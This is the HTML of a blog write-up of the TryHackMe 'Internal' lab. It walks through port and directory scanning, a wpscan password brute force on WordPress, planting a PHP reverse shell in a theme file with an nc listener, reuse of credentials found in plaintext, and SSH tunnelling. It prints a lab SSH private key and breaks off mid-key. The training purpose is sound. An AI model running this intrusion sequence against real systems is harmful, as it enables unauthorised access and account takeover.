M6,14.5C6,14.224,6.224,14,6.5,14h5c0.276,0,0.5,0.224,0.5,0.5S11.776,15,11.5,15  h-5C6.224,15,6,14.776,6,14.5z M6,16.5C6,16.224,6.224,16,6.5,16h5c0.276,0,0.5,0.224,0.5,0.5S11.776,17,11.5,17h-5  C6.224,17,6,16.776,6,16.5z M20,12.5c0-0.276,0.224-0.5,0.5-0.5h5c0.276,0,0.5,0.224,0.5,0.5S25.776,13,25.5,13h-5  C20.224,13,20,12.776,20,12.5z M20,14.5c0-0.276,0.224-0.5,0.5-0.5h5c0.276,0,0.5,0.224,0.5,0.5S25.776,15,25.5,15h-5  C20.224,15,20,14.776,20,14.5z M20,16.5c0-0.276,0.224-0.5,0.5-0.5h5c0.276,0,0.5,0.224,0.5,0.5S25.776,17,25.5,17h-5  C20.224,17,20,16.776,20,16.5z"></path></symbol></defs></svg>
+
+        <header class="bar-header">
+    <a id="menu" role="button">
+        <svg id="open" class="icon-menu"><use xlink:href="#icon-menu"></use></svg>
+    </a>
+    <h1 class="logo">
+        <a href="//">
+            H3X0S3 
+        </a>
+    </h1>
+    <a id="search" class="dosearch" role="button">
+        <svg class="icon-search"><use xlink:href="#icon-search"></use></svg>
+    </a>
+</header>
+
+<div id="mask" class="overlay"></div>
+
+<aside class="sidebar" id="sidebar">
+    <nav id="navigation">
+      <h2>Menu</h2>
+      <ul>
+  
+    
+      <li>
+        <a href="https://h3x0s3.github.io//">Home</a>
+      </li>
+    
+  
+    
+      <li>
+        <a href="https://h3x0s3.github.io//about">About</a>
+      </li>
+    
+  
+    
+      <li>
+        <a href="https://h3x0s3.github.io//contact">Contact</a>
+      </li>
+    
+  
+    
+      <li>
+        <a href="https://h3x0s3.github.io//feed.xml">Feed</a>
+      </li>
+    
+  
+</ul>
+
+    </nav>
+</aside>
+
+<div class="search-wrapper">
+    <div class="search-form">
+        <input type="text" class="search-field" placeholder="Search">
+        <svg class="icon-remove-sign"><use xlink:href="#icon-close"></use></svg>
+        <ul class="search-results search-list"></ul>
+    </div>
+</div>
+
+
+
+        <section class="post two-columns">
+            <article role="article" class="post-content">
+                <p class="post-info">
+                    
+                        <svg class="icon-calendar" id="date"><use xlink:href="#icon-calendar"></use></svg>
+                        <time class="date" datetime="2022-02-11T00:48:05+01:00">
+                            
+
+
+February 11, 2022
+
+                        </time>
+                    
+                    <svg id="clock" class="icon-clock"><use xlink:href="#icon-clock"></use></svg>
+                    <span>15 min to read</span>
+                </p>
+                <h1 class="post-title">Internal</h1>
+                <p class="post-subtitle">Internal for TyHackMe Writeup.</p>
+
+                
+                    <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/222b3e855f88a482c1267748f76f90e0.jpeg" alt="Featured image" class="post-cover">
+                
+
+                <!-- Pagination links -->
+
+
+
+                <!-- Add your table of contents here -->
+
+
+                <h2 id="preengagement-briefing">Pre-engagement Briefing</h2>
+
+<hr />
+<p>You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks.</p>
+
+<p>Scope of Work</p>
+
+<p>The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:</p>
+
+<ul>
+  <li>User.txt</li>
+  <li>Root.txt</li>
+</ul>
+
+<p>Additionally, the client has provided the following scope allowances:</p>
+
+<ul>
+  <li>Ensure that you modify your hosts file to reflect internal.thm</li>
+  <li>Any tools or techniques are permitted in this engagement</li>
+  <li>Locate and note all vulnerabilities found</li>
+  <li>Submit the flags discovered to the dashboard</li>
+  <li>Only the IP address assigned to your machine is in scope</li>
+</ul>
+
+<p>(Roleplay off)</p>
+
+<hr />
+
+<h1 id="enumeration-">Enumeration</h1>
+
+<blockquote>
+  <p>nmap -sC -A 10.10.132.80</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh~|-|hostkey: 
+|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e <span class="o">(</span>RSA<span class="o">)</span>
+|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http~|-|server~|-|header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http~|-|title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+
+</code></pre></div></div>
+<p>we have two open ports</p>
+
+<ul>
+  <li>22/tcp open  ssh</li>
+  <li>
+    <p>80/tcp open  http
+we will enumerat web as we have 80/tcp open  http</p>
+  </li>
+  <li>Add 10.10.132.80 to /etc/hosts as internal.thm</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+root@kali:~~|#| dirb http://10.10.93.161/ ~|-|w /usr/share/wordlists/dirb/common.txt
+ 
+~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|
+DIRB v2.22    
+By The Dark Raver
+~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|
+ 
+START_TIME: Thu Feb 10 11:27:33 2022
+URL_BASE: http://10.10.93.161/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Not Stopping on warning messages
+ 
+~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|
+ 
+GENERATED WORDS: 4612                                                          
+ 
+~|-|~|-|~|-|~|-| Scanning URL: http://10.10.93.161/ ~|-|~|-|~|-|~|-|
+~|<span class="o">=</span>|~|<span class="o">=</span>|&gt; DIRECTORY: http://10.10.93.161/blog/                                                                      
++ http://10.10.93.161/index.html <span class="o">(</span>CODE:200|SIZE:10918<span class="o">)</span>                                                        
+~|<span class="o">=</span>|~|<span class="o">=</span>|&gt; DIRECTORY: http://10.10.93.161/javascript/                                                                
+~|<span class="o">=</span>|~|<span class="o">=</span>|&gt; DIRECTORY: http://10.10.93.161/phpmyadmin/                                                                
++ http://10.10.93.161/server~|-|status <span class="o">(</span>CODE:403|SIZE:277<span class="o">)</span>                                                       
+~|<span class="o">=</span>|~|<span class="o">=</span>|&gt; DIRECTORY: http://10.10.93.161/wordpress/                                                                                                                                           ss/images/zt                   
+~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|
+END_TIME: Thu Feb 10 11:34:57 2022
+DOWNLOADED: 677964 ~|-| FOUND: 36
+root@kali:~~|#|
+</code></pre></div></div>
+<p>we have two interesting endpoints</p>
+
+<blockquote>
+  <p>/wordpress</p>
+</blockquote>
+
+<blockquote>
+  <p>/blog</p>
+</blockquote>
+
+<hr />
+
+<h1 id="enumeration-wordpress">Enumeration Wordpress</h1>
+
+<p>Browsing <code class="language-plaintext highlighter-rouge">/blog</code>  this is a Wordpress blog,So let’s enumerate it with wpscan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~~|#| wpscan ~|-|~|-|url http://internal.thm/blog ~|-|e u
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+ 
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.6
+ 
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+ 
+[i] Updating the Database ...
+[i] Update completed.
+ 
+[+] URL: http://internal.thm/blog/ [10.10.93.161]
+[+] Started: Thu Feb 10 11:31:07 2022
+ 
+Interesting Finding(s):
+ 
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+ 
+[+] XML~|-|RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  ~|-| http://codex.wordpress.org/XML~|-|RPC_Pingback_API
+ |  ~|-| https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  ~|-| https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  ~|-| https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  ~|-| https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+ 
+[+] WordPress readme found: http://internal.thm/blog/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ 
+[+] The external WP~|-|Cron seems to be enabled: http://internal.thm/blog/wp~|-|cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  ~|-| https://www.iplocation.net/defend~|-|wordpress~|-|from~|-|ddos
+ |  ~|-| https://github.com/wpscanteam/wpscan/issues/1299
+ 
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020~|-|06~|-|10).
+ | Found By: Rss Generator (Passive Detection)
+ |  ~|-| http://internal.thm/blog/index.php/feed/, ~|&lt;|generator&gt;https://wordpress.org/?v~|=|5.4.2~|&lt;|/generator&gt;
+ |  ~|-| http://internal.thm/blog/index.php/comments/feed/, ~|&lt;|generator&gt;https://wordpress.org/?v~|=|5.4.2~|&lt;|/generator&gt;
+ 
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://internal.thm/blog/wp~|-|content/themes/twentyseventeen/
+ | Last Updated: 2022~|-|01~|-|25T00:00:00.000Z
+ | Readme: http://internal.thm/blog/wp~|-|content/themes/twentyseventeen/readme.txt
+ | [!] The version is out of date, the latest version is 2.9
+ | Style URL: http://internal.thm/blog/wp~|-|content/themes/twentyseventeen/style.css?ver~|=|20190507
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  ~|-| http://internal.thm/blog/wp~|-|content/themes/twentyseventeen/style.css?ver~|=|20190507, Match: '</span>Version: 2.3<span class="s1">'
+ 
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs ~|-| Time: 00:00:00 ~|&lt;|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|&gt; (10 / 10) 100.00% Time: 00:00:00
+ 
+[i] User(s) Identified:
+ 
+[+] admin
+ | Found By: Author Posts ~|-| Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   ~|-| http://internal.thm/blog/index.php/wp~|-|json/wp/v2/users/?per_page~|=|100&amp;page~|=|1
+ |  Author Id Brute Forcing ~|-| Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+ 
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+ 
+
+ 
+root@kali:~~|#|
+</span></code></pre></div></div>
+
+<p>we have interesting output</p>
+
+<p>-admin Author Posts</p>
+
+<p>so we have a user name as admin</p>
+
+<p>try to login with it as default credentials</p>
+
+<p><img src="https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/posts/tryhackme/internal/default-credentials.png" alt="" /></p>
+
+<p>press This email is correct</p>
+
+<p><img src="https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/posts/tryhackme/internal/login.png" alt="" /></p>
+
+<p>the default credentials is wrong, now we have the request of the login so try to brute force the password of admin.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+kali@kali:/data/The_Blob_Blog/files<span class="nv">$ </span>wpscan ~|-|~|-|url http://internal.thm/blog ~|-|U admin ~|-|P /usr/share/wordlists/rockyou.txt 
+
+<span class="o">[</span>REDACTED]
+
+<span class="o">[!]</span> Valid Combinations Found:
+ | Username: admin, Password: my2boys
+
+<span class="o">[</span>REDACTED]
+</code></pre></div></div>
+<h1 id="credentials-and-user-falg">Credentials and user falg</h1>
+
+<p>now we have the credentials</p>
+
+<ul>
+  <li>admin:my2boys</li>
+</ul>
+
+<p>try to login at  <a href="http://internal.thm/blog/wp-admin/" title="Login">Login</a> and enumerate to get a reverse shell</p>
+
+<p>after enumeration i found a php code in some pages</p>
+
+<p><img src="https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/posts/tryhackme/internal/page-php.png" alt="" /></p>
+
+<p>i will go to 404.php as it is easy to open it and excute my PHP reverse shell so  replace the PHP code with our PHP reverse shell</p>
+
+<p>modify the shell to connect to my nc</p>
+
+<p><img src="https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/posts/tryhackme/internal/first-shell.png" alt="" /></p>
+
+<p>run nc to recive connection after opening <a href="http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php" title="404.php">404.php</a></p>
+
+<p><img src="https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/posts/tryhackme/internal/first-shell.png" alt="" /></p>
+
+<h2 id="spwan-shell">spwan shell</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python ~|-|c <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+www~|-|data@internal:/<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www~|-|data
+</code></pre></div></div>
+<p>get my fisrt shell and we can read the user flag</p>
+
+<hr />
+
+<h1 id="lateral-movement-from-wwwdata-to-aubreanna">Lateral movement from www-data to aubreanna</h1>
+
+<p>after enumeration i find an important file in /opt directory</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+
+root@kali:/home~|#| <span class="nb">sudo </span>nc ~|-|lvnp 1231
+listening on <span class="o">[</span>any] 1231 ...
+connect to <span class="o">[</span>10.10.132.80] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.93.161] 45196
+<span class="nb">ls
+</span>bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+</code></pre></div></div>
+<p>ofter seaching for user flag i cant ifnd it XD</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /opt
+www~|-|data@internal:/opt<span class="nv">$ </span><span class="nb">ls    
+ls
+</span>containerd  wp~|-|save.txt
+www~|-|data@internal:/opt<span class="nv">$ </span><span class="nb">cat </span>wp~|-|save.txt
+<span class="nb">cat </span>wp~|-|save.txt
+Bill,
+ 
+Aubreanna needed these credentials <span class="k">for </span>something later.  Let her know you have them and where they are.
+ 
+aubreanna:bubb13guM!@~|#|123
+
+
+</code></pre></div></div>
+<p>try this credentials to upgare as aubreanna</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www~|-|data@internal:/opt<span class="nv">$ </span>su aubreanna    
+su aubreanna
+Password: bubb13guM!@~|#|123
+ 
+aubreanna@internal:/opt<span class="nv">$ </span><span class="nb">id
+id
+</span>uid~|<span class="o">=</span>|1000<span class="o">(</span>aubreanna<span class="o">)</span> gid~|<span class="o">=</span>|1000<span class="o">(</span>aubreanna<span class="o">)</span> <span class="nb">groups</span>~|<span class="o">=</span>|1000<span class="o">(</span>aubreanna<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>
+aubreanna@internal:/opt<span class="nv">$ </span><span class="nb">whoami 
+whoami
+</span>aubreanna
+
+</code></pre></div></div>
+
+<h1 id="user-flag">user flag</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+aubreanna@internal:/opt$ cd /home/aubreanna
+cd /home/aubreanna
+aubreanna@internal:~$ ls ~|-|la
+ls ~|-|la
+total 56
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 7 aubreanna aubreanna 4096 Aug  3  2020 .
+drwxr~|-|xr~|-|x 3 root      root      4096 Aug  3  2020 ..
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 .local
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 root      root       223 Aug  3  2020 .mysql_history
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna  807 Apr  4  2018 .profile
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 snap
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
+aubreanna@internal:~$ cat us
+cat user.txt 
+THM{D0n'T_C0Py~|-|AnD~|-|PaSt}
+
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="root-flag-">Root Flag</h1>
+
+<p>try to see if there any way to privilege escalation</p>
+
+<h2 id="enumeration">enumeration</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+
+aubreanna@internal:~<span class="nv">$ </span><span class="nb">sudo</span> ~|-|l
+<span class="nb">sudo</span> ~|-|l
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>aubreanna: bubb13guM!@~|#|123
+ 
+Sorry, user aubreanna may not run <span class="nb">sudo </span>on internal.
+aubreanna@internal:~<span class="nv">$ </span><span class="nb">ls</span> ~|-|la
+<span class="nb">ls</span> ~|-|la
+total 56
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 7 aubreanna aubreanna 4096 Aug  3  2020 <span class="nb">.</span>
+drwxr~|-|xr~|-|x 3 root      root      4096 Aug  3  2020 ..
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 .local
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 root      root       223 Aug  3  2020 .mysql_history
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna  807 Apr  4  2018 .profile
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 3 aubreanna aubreanna 4096 Aug  3  2020 snap
+~|-|rwx~|-|~|-|~|-|~|-|~|-|~|-| 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
+aubreanna@internal:~<span class="nv">$ </span><span class="nb">cd</span> .sudo_as_admin_successful
+<span class="nb">cd</span> .sudo_as_admin_successful
+bash: <span class="nb">cd</span>: .sudo_as_admin_successful: Not a directory
+aubreanna@internal:~<span class="nv">$ </span><span class="nb">cat</span> .sudo_as_admin_successful
+<span class="nb">cat</span> .sudo_as_admin_successful
+</code></pre></div></div>
+
+<h2 id="cheack-if-there-any-internal-network-">cheack if there any internal network !</h2>
+
+<p>note that in the same directory of user falg there is a file called jenkins.txt</p>
+
+<p>Jenkins is an open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat. It supports version control tools, including AccuRev, CVS, Subversion, Git, Mercurial, Perforce, ClearCase and RTC, and can execute Apache Ant, Apache Maven and sbt based projects as well as arbitrary shell scripts and Windows batch commands.</p>
+
+<p>so read the file !</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aubreanna@internal:~<span class="nv">$ </span><span class="nb">cat </span>jenkins.txt 
+Internal Jenkins service is running on 172.17.0.2:8080
+
+</code></pre></div></div>
+<blockquote>
+  <p>Ip:Port!
+so cheah netstat</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aubreanna@internal:~<span class="nv">$ </span>netstat ~|-|tulp
+netstat ~|-|tulp
+<span class="o">(</span>Not all processes could be identified, non~|-|owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv~|-|Q Send~|-|Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 localhost:mysql         0.0.0.0:<span class="k">*</span>               LISTEN      ~|-|                   
+tcp        0      0 localhost:http~|-|alt      0.0.0.0:<span class="k">*</span>               LISTEN      ~|-|                   
+tcp        0      0 localhost:domain        0.0.0.0:<span class="k">*</span>               LISTEN      ~|-|                   
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:<span class="k">*</span>               LISTEN      ~|-|                   
+tcp        0      0 localhost:43329         0.0.0.0:<span class="k">*</span>               LISTEN      ~|-|                   
+tcp6       0      0 <span class="o">[</span>::]:http               <span class="o">[</span>::]:<span class="k">*</span>                  LISTEN      ~|-|                   
+tcp6       0      0 <span class="o">[</span>::]:ssh                <span class="o">[</span>::]:<span class="k">*</span>                  LISTEN      ~|-|                   
+udp        0      0 localhost:domain        0.0.0.0:<span class="k">*</span>                           ~|-|                   
+udp        0      0 ip~|-|10~|-|10~|-|93~|-|161.:bootpc 0.0.0.0:<span class="k">*</span>                           ~|-|                   
+
+
+</code></pre></div></div>
+
+<p>as i expected there is a internal network if you need to confarm do curl command for 172.17.0.2:8080</p>
+
+<ul>
+  <li>Remember as we discover ports in scanning we have ssh port 22 !</li>
+</ul>
+
+<p>we can do ssh port forwarding</p>
+
+<p>on our machine</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+
+root@kali:~/Desktop/importatnt~|#| ssh~|-|keygen
+Generating public/private rsa key pair.
+Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/root/.ssh/id_rsa<span class="o">)</span>: /root/Desktop/importatnt/id_rsa
+Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
+Enter same passphrase again: 
+Your identification has been saved <span class="k">in</span> /root/Desktop/importatnt/id_rsa
+Your public key has been saved <span class="k">in</span> /root/Desktop/importatnt/id_rsa.pub
+The key fingerprint is:
+SHA256:DpdmntdA+PO2S4hLzL1dycPHsKnw2O6z2eSq2InFMOw root@kali
+The key<span class="s1">'s randomart image is:
++~|-|~|-|~|-|[RSA 3072]~|-|~|-|~|-|~|-|+
+|                 |
+|         .       |
+|        . .      |
+|       . +       |
+|      . S +   .  |
+|       @ B * o * |
+|        E B ~|=| X o|
+|       . B @.O o |
+|        + *+&amp;~|=|o  |
++~|-|~|-|~|-|~|-|[SHA256]~|-|~|-|~|-|~|-|~|-|+
+root@kali:~/Desktop/importatnt~|#| ls ~|-|la
+total 16
+drwxr~|-|xr~|-|x 2 root root 4096 Feb 10 12:09 .
+drwxr~|-|xr~|-|x 4 root root 4096 Feb 10 12:09 ..
+~|-|rw~|-|~|-|~|-|~|-|~|-|~|-|~|-| 1 root root 2590 Feb 10 12:09 id_rsa
+~|-|rw~|-|r~|-|~|-|r~|-|~|-| 1 root root  563 Feb 10 12:09 id_rsa.pub
+root@kali:~/Desktop/importatnt~|#| cat id_rsa
+~|-|~|-|~|-|~|-|~|-|BEGIN OPENSSH PRIVATE KEY~|-|~|-|~|-|~|-|~|-|
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAwCqRV+UbXVsbyzAfE1IiGxHF20xyRXbK2nfLXxh4a+oBx8rcWRsx
+yV+5082I/BZ+tILwxac0AxVPULWpaSVe3E4dfISuXHA0yafdECENSz856Y8HWNOQf6VnEh
+0cRE0AClw6gZfP8RoOhzzQhizEZk1+r6bxu0x/TUXKAbdGNVMsi313bVDTYOIJUqK73m46
+D5w/rD92csN84R9m4jHNlbOsrSCM6Ooqh8Njo3FgxLQxzs+5/mfhjgDwQ/HeXY9CM9V8ag
+8OwrGMNuP3HwWvYfFQ75ln+pEgSSIZWLgOI6s8bbXqeaO/SD+ryS0Ph1Uho+8kDAUIcfTr
+zz46Lf2/aI1cbKAjnky17DweDdSZBd6H1KdBExxH0Pkk7nC5MhKzTPWP7qnOSlX6gFDQ75
+FSUIIYxS9vQkPI3emLzrBkBYzxsiSmHpZAMfVHWApFUh4XPl37oNjWTIOKlIW6Ti7KUg56
+3uwAdxR7pPHyWnqJEZPQK5cxDm/ntV2hjWElVsUfAAAFgPyepqD8nqagAAAAB3NzaC1yc2
+EAAAGBAMAqkVflG11bG8swHxNSIhsRxdtMckV2ytp3y18YeGvqAcfK3FkbMclfudPNiPwW
+frSC8MWnNAMVT1C1qWklXtxOHXyErlxwNMmn3RAhDUs/OemPB1jTkH+lZxIdHERNAApcOo
+GXz/EaDoc80IYsxGZNfq+m8btMf01FygG3RjVTLIt9d21Q02DiCVKiu95uOg+cP6w/dnLD
+fOEfZuIxzZWzrK0gjOjqKofDY6NxYMS0Mc7Puf5n4Y4A8EPx3l2PQjPVfGoPDsKxjDbj9x
+8Fr2HxUO+ZZ/qRIEkiGVi4DiOrPG216nmjv0g/q8ktD4dVIaPvJAwFCHH0688+Oi39v2iN
+XGygI55Mtew8Hg3UmQXeh9SnQRMcR9D5JO5wuTISs0z1j+6pzkpV+oBQ0O+RUlCCGMUvb0
+JDyN3pi86wZAWM8bIkph6WQDH1R1gKRVIeFz5d+6DY1kyDipSFuk4uylIOet7sAHcUe6Tx
+8lp6iRGT0CuXMQ5v57VdoY1hJVbFHwAAAAMBAAEAAAGBAIpzoPhE12xxohrI9vrCqFP8gC
+M6dvJZXln9CYfgZ5LIrLO4Ev4YO8ysrYROh62ov21rEfI2P6EhD15FJGPfSvNLTK9UIRP0
+u/O2f+2JArz+NslyBYcYFvoAv7wrQRxspeTRAk4whN9fOKxzQoIJaw+SMf54N54MxYN1Dt
+AhrfHplSSDJzKZk1IwSStCmDzwCeEJYE7IAp04/5ZrO4MpAsgjBfxOgXemjzH1sqolm+Td
+Ny2cOJN1YOsg/frWHrIl7fnpM3EIrIJnvVknXrxzISckGBwhABy7CRCUrSpm58nQZlSYF5
+RKH+KRXJKoaHKJ8USZ5dojt1R7yVJsDymaG9shrIczih2vou9mkMs3AuE30wr+PhpgbnFV
+k2MyUkE2VO9GyhtrMnaxP2iIhGfyncv0T5S93dAqlPq4FOUuHarDD8Euwum9iFvuVQmYHi
